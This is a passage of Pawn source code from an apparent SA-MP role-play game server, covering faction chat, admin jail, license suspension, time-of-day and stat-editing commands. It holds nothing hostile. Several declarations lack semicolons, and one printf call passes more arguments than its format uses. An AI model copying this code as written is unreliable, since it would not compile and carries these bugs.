            else if(PlayerInfo[playerid][pLeader] == 20) { arank = "{F3A32A}<< {60F565}SFPD Leader {F3A32A}>>"; }
                format(string, sizeof(string), " {E6E6E6}%s {E6E6E6}%s: {FFFFFF}%s {E04343}", arank, sendername, result);
                        if (PlayerInfo[playerid][pLeader] >= 1)
            {
                SendLeaderMessage(COLOR_GG, string);
                printf("Leader {E6E6E6}%s: {FFFFFF}%s", sendername, result);
            }
        }
        return 1;
    }


// ----------------------------------------------

// CM Chat

// ----------------------------------------------
//lc chat
if(strcmp(cmd, "/chatmafia2", true) == 0 || strcmp(cmd, "/cm2", true) == 0)
    {
        if(PINFO[playerid][pLeader] == 0 && PlayerInfo[playerid][pMember] == 0) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 1) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 2) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 3) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 4) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 7) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 8) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 9) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 10) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 11) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(PINFO[playerid][pLeader] == 16) return SCM(playerid, COLOR_YELLOW2, "Error: Only Leader's Can Use This Command. ");
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result)) return SCM(playerid,COL_SYN,"Syntax: /cm <Text>");
            new arank[64];
            if(PlayerInfo[playerid][pLeader] == 5) { arank = "{5D7E8D}<< Silence Mafia Leader >>"; }
            else if(PlayerInfo[playerid][pLeader] == 6) { arank = "{333334}<< The Killers Mafia Leader >>"; }
            else if(PlayerInfo[playerid][pLeader] == 12) { arank = "{05b11d}<< Dangerous Tigers Mafia Leader >>"; }
            else if(PlayerInfo[playerid][pLeader] == 13) { arank = "{ffcc00}<< Legendary Men Mafia Leader >>"; }
            else if(PlayerInfo[playerid][pLeader] == 14) { arank = "{B32CF6}<< Fast N Furious Family Leader >>"; }
            else if(PlayerInfo[playerid][pLeader] == 15) { arank = "{00ECEC}<< Storm Men Mafia Leader >>"; }
            else if(PlayerInfo[playerid][pLeader] == 17) { arank = "{57e547}<< Staff / Founder >>"; }
            else if(PlayerInfo[playerid][pLeader] == 19) { arank = "{0E47FF}<< The Racers Leader >>"; }
            else if(PlayerInfo[playerid][pMember] == 5) { arank = "{5D7E8D}<< Silence Mafia Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 6) { arank = "{333334}<< The Killers Mafia Rank Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 12) { arank = "{05b11d}<< Dangerous Tigers Mafia Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 13) { arank = "{ffcc00}<< Legendary Men Mafia Rank Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 14) { arank = "{B32CF6}<< Fast N Furious Family Rank Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 15) { arank = "{00ECEC}<< Storm Men Mafia Rank Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 17) { arank = "{57e547}<< Staff / Founder Rank Member >>"; }
            else if(PlayerInfo[playerid][pMember] == 19) { arank = "{0E47FF}<< The Racers Rank Member >>"; }
                format(string, sizeof(string), " %s {33CCFF}%s:{FFFFFF} %s {E04343}", arank, sendername, result);
            if (PlayerInfo[playerid][pLeader] == 5 || PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pLeader] == 13 || PlayerInfo[playerid][pLeader] == 14 || PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pLeader] == 16)
            {
                SendLeadermMessage(COLOR_GG, string);
                printf("Leader %s: %s", sendername, result);
            }
            if (PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pMember] == 16)
            {
                SendMemberMessage(COLOR_GG, string);
                printf("Member %s: %s", PlayerInfo[playerid][pRank], sendername, result);
            }
        }
        return 1;
    }

//--------------------------------------------------------------------------------------
    if(!strcmp(cmd,"/cnn",true))
    {
        if(PINFO[playerid][pAdmin] < 4) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /cnn <Type> <Time(In Second)> <Text>");
        new typp = strval(tmp);
        if(typp < 0 || typp > 6) return SCM(playerid,COL_SYN,"Invalid Type.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /cnn <Type> <Time(In Second)> <Text>");
        new times = strval(tmp)*1000;
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /cnn <Type> <Time(In Second)> <Text>");
        new AlRo[50];
        format(AlRo, 50, "~b~%s: ~w~%s", PINFO[playerid][pName], tmp);
        GameTextForAll(AlRo, times, typp);
        return 1;
    }
    if(strcmp(cmd, "/ajail", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /ajail [playerid/PartOfName] [time(Seconds)] [reason]");
                return 1;
            }
            new playa;
            new money;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            money = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
                        new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /ajail [playerid/PartOfName] [time(minute)] [reason]");
                            return 1;
                        }
                        format(string, sizeof(string), "You Jailed %s.", giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTRED, string);
                        format(string, sizeof(string), "You were Jailed by Admin %s.", sendername);
                        SendClientMessage(playa, COLOR_LIGHTRED, string);
                        ResetPlayerTofang(playa);
                        SetPlayerWantedLevel(playa,0);
                        PlayerInfo[playa][pJailTime] = money*60;
                        SaveKonVal(playa, "pJailTime", PINFO[playa][pJailTime]);
                        format(string, sizeof(string), "You are jailed for %d:00 minute", money);
                        SendClientMessage(playa, COLOR_WHITE, string);
                        format(string, 256, "AdmCmd: %s Zendani Shod Baraye %d:00 Daghighe Tavasote Admin %s [Dalil: %s]", giveplayer, money, sendername, (result));
                        BroadCast(COLOR_LIGHTRED,string);
						/*format(string, sizeof(string), "AdmCmd: %s has been Admin-jailed For %d:%02d minute by %s [Reason: %s]", giveplayer, money/60,money-(floatround(money/60)*60), sendername, (result));
						printf("%s",string);*/
                        SpawnPlayer(playa);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/asl", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
			if (PlayerInfo[playerid][pAdmin] >= 7)
            {
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SendClientMessage(playerid, CRISTIAN, "|__________________ Suspend Licenses __________________|");
                    SendClientMessage(playerid, COLOR_WHITE, "Type: /asl [licensename] [playerid/PartOfName] [hours]");
                    SendClientMessage(playerid, COLOR_GREY, "Available names: Driving, Flying, Boating, Weapons, Materials");
                    SendClientMessage(playerid, CRISTIAN, "|___________________________________________________|");
                    return true;
                }
                else if(strcmp(x_nr,"Flying",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /asl flying [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pFlyLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a flying license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
							format(string, sizeof(string), "You have suspended %s's Fly License for %d hours.", giveplayer, stime);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "Admin %s has suspended your Fly License for %d hours.", sendername, stime);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							PlayerInfo[giveplayerid][pFlyLic] = 0;
							PlayerInfo[giveplayerid][pFlyLicS] = stime;
							SaveKonVal(giveplayerid, "pFlyLic", 0);
							SaveKonVal(giveplayerid, "pFlyLicS", stime);
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"Boating",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /asl boating [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pBoatLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a Boat license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Boating License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Admin %s has suspended your Boating License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pBoatLic] = 0;
                                PlayerInfo[giveplayerid][pBoatLicS] = stime;
                                SaveKonVal(giveplayerid, "pBoatLic", 0);
                                SaveKonVal(giveplayerid, "pBoatLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"materials",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /asl materials [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pMatsLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a materials license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Materials License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Admin %s has suspended your Materials License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pMatsLic] = 0;
                                PlayerInfo[giveplayerid][pMatsLicS] = stime;
                                SaveKonVal(giveplayerid, "pMatsLic", 0);
                                SaveKonVal(giveplayerid, "pMatsLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"Weapons",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /asl weapons [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pGunLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a Weapon license to suspend.");
                        return true;
                    }

                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Weapons License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Admin %s has suspended your Weapons License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pGunLic] = 0;
                                PlayerInfo[giveplayerid][pGunLicS] = stime;
                                SaveKonVal(giveplayerid, "pGunLic", 0);
                                SaveKonVal(giveplayerid, "pGunLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_LIGHTRED, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else if(strcmp(x_nr,"driving",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /asl driving [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pCarLic] == 0)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player hasen't a Driving license to suspend.");
                        return true;
                    }
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            if (ProxDetectorS(8.0, playerid, giveplayerid))
                            {
                                format(string, sizeof(string), "You have suspended %s's Driving License for %d hours.", giveplayer, stime);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "Admin %s has suspended your Driving License for %d hours.", sendername, stime);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                PlayerInfo[giveplayerid][pCarLic] = 0;
                                PlayerInfo[giveplayerid][pCarLicS] = stime;
                                SaveKonVal(giveplayerid, "pCarLic", 0);
                                SaveKonVal(giveplayerid, "pCarLicS", stime);
                            }
                            else
                            {
                                SendClientMessage(playerid, COLOR_WHITE, "That player is not near you");
                                return true;
                            }
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "That player is Offline");
                        return true;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_LIGHTRED, "Unknown Suspend name");
                    return true;
                }
            }
            else
            {
				SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
                return true;
            }
        }
        return true;
    }
//----------------------------------[TOD]-----------------------------------------------

    if(strcmp(cmd, "/tod", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /tod [timeofday] (0-23)");
                return 1;
            }
            new hour;
            hour = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 5)
            {
                SetWorldTime(hour);
                format(string, sizeof(string), "** Time set to %d Hours.", hour);
                BroadCast(COLOR_GRAD1, string);
            }
            else
            {
                  SCM(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
                  return 1;
            }
        }
        return 1;
    }
//-----------------------------------editstat---------------------------------------
		if(strcmp(cmd, "/setstat", true) == 0)
		{
		if (PlayerInfo[playerid][pAdmin] < 9) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
			if(IsPlayerConnected(playerid))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
							SendMessage(playerid, COLOR_GRAD1, "USPGE: /setstat [playerid/PartOfName] [statcode] [amount]");
							SendMessage(playerid, COLOR_GRAD2, "|1 Level |2 Mats skill |3 BankAccount");
							SendMessage(playerid, COLOR_GRAD2, "|4 PhoneNumber |5 RespectPoints |6 HouseKey |7 BizKey");
							SendMessage(playerid, COLOR_GRAD2, "|8 FMember |9 FRank |10 Detectiveskill |11 Lawyerskill |12 MechanicSkill");
							SendMessage(playerid, COLOR_GRAD2, "|13 NewsSkill |14 JackSkill |15 DrugSkill");
							SendMessage(playerid, COLOR_GRAD2, "|16 Lawyer Points |17 VehicleID[Bug] |18 Rob Points |19 FPunish");
							SendMessage(playerid, COLOR_GRAD2, "|20 Fwarn |21 Sex |22 RobSkill");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);

				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
						tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendMessage(playerid, COLOR_GRAD1, "USPGE: /setstat [playerid/PartOfName] [statcode] [amount]");
							SendMessage(playerid, COLOR_GRAD2, "|1 Level |2 Mats skill |3 BankAccount");
							SendMessage(playerid, COLOR_GRAD2, "|4 PhoneNumber |5 RespectPoints |6 HouseKey |7 BizKey");
							SendMessage(playerid, COLOR_GRAD2, "|8 FMember |9 FRank |10 Detectiveskill |11 Lawyerskill |12 MechanicSkill");
							SendMessage(playerid, COLOR_GRAD2, "|13 NewsSkill |14 JackSkill |15 DrugSkill");
							SendMessage(playerid, COLOR_GRAD2, "|16 Lawyer Points |17 VehicleID[Bug] |18 Rob Points |19 FPunish");
							SendMessage(playerid, COLOR_GRAD2, "|20 Fwarn |21 Sex |22 RobSkill");
							return 1;
						}
						new stat;
						stat = strval(tmp);
		 tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendMessage(playerid, COLOR_GRAD1, "USPGE: /setstat [playerid/PartOfName] [statcode] [amount]");
							SendMessage(playerid, COLOR_GRAD2, "|1 Level |2 Mats skill |3 BankAccount");
							SendMessage(playerid, COLOR_GRAD2, "|4 PhoneNumber |5 RespectPoints |6 HouseKey |7 BizKey");
							SendMessage(playerid, COLOR_GRAD2, "|8 FMember |9 FRank |10 Detectiveskill |11 Lawyerskill |12 MechanicSkill");
							SendMessage(playerid, COLOR_GRAD2, "|13 NewsSkill |14 JackSkill |15 DrugSkill");
							SendMessage(playerid, COLOR_GRAD2, "|16 Lawyer Points |17 PremiumAccount |18 Rob Points |19 FPunish");
							SendMessage(playerid, COLOR_GRAD2, "|20 Fwarn |21 Sex |22 RobSkill");
							return 1;
						}
						GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						new amount;
						amount = strval(tmp);

							switch (stat)
							{

								case 1:
								{

									PlayerInfo[giveplayerid][pLevel] = amount;
									SaveKonVal(giveplayerid, "pLevel", amount);
									format(string, sizeof(string), "The Player Was Set To Level %d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Level %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Level To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 2:
								{

									PlayerInfo[giveplayerid][pMatsSkill] = amount;
									SaveKonVal(giveplayerid, "pMatsSkill", amount);
									format(string, sizeof(string), "The Player Was Set To %d MatsSkill", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set MatsSkill%s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "[Admin-Warn]:{FFFFFF} %s Sets Your Mats Skill To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 3:
								{
									PlayerInfo[giveplayerid][pAccount] = amount;
									SaveKonVal(giveplayerid, "pAccount", amount);
									format(string, sizeof(string), "The Player Account Was Set To $%d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set BankAccount %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Bank Account To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 4:
								{
									SetPlayerNumber(giveplayerid,playerid,amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Number %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Phone Number To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
									return 1;
								}
								case 5:
								{
									PlayerInfo[giveplayerid][pExp] = amount;
									SaveKonVal(giveplayerid, "pExp", amount);
									format(string, sizeof(string), "The Player Respect Points Were Set To %d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Exp %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Exp to %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 6:
								{
									PlayerInfo[giveplayerid][pPhousekey] = amount;
									SaveKonVal(giveplayerid, "pPhousekey", amount);
									format(string, sizeof(string), "The Player House Key Was Set To %d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set HouseKey %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your House Key to %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 7:
								{
									PlayerInfo[giveplayerid][pPbiskey] = amount;
									SaveKonVal(giveplayerid, "pPbiskey", amount);
									format(string, sizeof(string), "The Player Business Key Was Set To %d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Biz Key %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your BizKey To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 8:
								{
									PlayerInfo[giveplayerid][pMember] = amount;
									SaveKonVal(giveplayerid, "pMember", amount);
									format(string, sizeof(string), "The Player Faction Member Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set FMember %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Faction Member to %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 9:
								{
									PlayerInfo[giveplayerid][pRank] = amount;
									SaveKonVal(giveplayerid, "pRank", amount);
									format(string, sizeof(string), "The Player Faction Rank Set To %d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set FRank %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Faction Rank To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 10:
								{
									PlayerInfo[giveplayerid][pDetSkill] = amount;
									SaveKonVal(giveplayerid, "pDetSkill", amount);
									format(string, sizeof(string), "The Player Detective Skill Set To %d", amount);
									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set DetectiveSkill %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Detective Skill To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 11:
								{
									PlayerInfo[giveplayerid][pLawSkill] = amount;
									SaveKonVal(giveplayerid, "pLawSkill", amount);
									format(string, sizeof(string), "The Player Lawyer Skill Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set Lawyer Skill %s to %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Lawyer Skill To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 12:
								{
									PlayerInfo[giveplayerid][pMechSkill] = amount;
									SaveKonVal(giveplayerid, "pMechSkill", amount);
									format(string, sizeof(string), "The Player Car Mechanic Skill Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set MechanicSkill %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your MechanicSkill To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 13:
								{
									PlayerInfo[giveplayerid][pNewsSkill] = amount;
									SaveKonVal(giveplayerid, "pNewsSkill", amount);
									format(string, sizeof(string), "The Player News Reporter Skill Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set News Skill %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Nr SKill To %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 14:
								{
									PlayerInfo[giveplayerid][pJackSkill] = amount;
									SaveKonVal(giveplayerid, "pJackSkill", amount);
									format(string, sizeof(string), "The Player Car Jacker Skill Set To %d", amount);

									new strr[512];
									format(strr, sizeof(strr), "[Admin-Warn]:{FFFFFF} %s Used Set JackSkill %s To %d", sendername, giveplayer, amount);
									ABroadCast(COLOR_AdminWarn,strr,1);

									new ws[512]
									format(ws, sizeof(ws), "%s Sets Your Jack SKill to %d", sendername, amount);
									SendMessage(giveplayerid, COLOR_AdminWarn, ws);
								}
								case 15:
								{
									PlayerInfo[giveplayerid][pDrugsSkill] = amount;
									SaveKonVal(giveplayerid, "pDrugsSkill", amount);
									format(string, sizeof(string), "The Player Drug Dealer Skill Set To %d", amount);

									new strr[512];
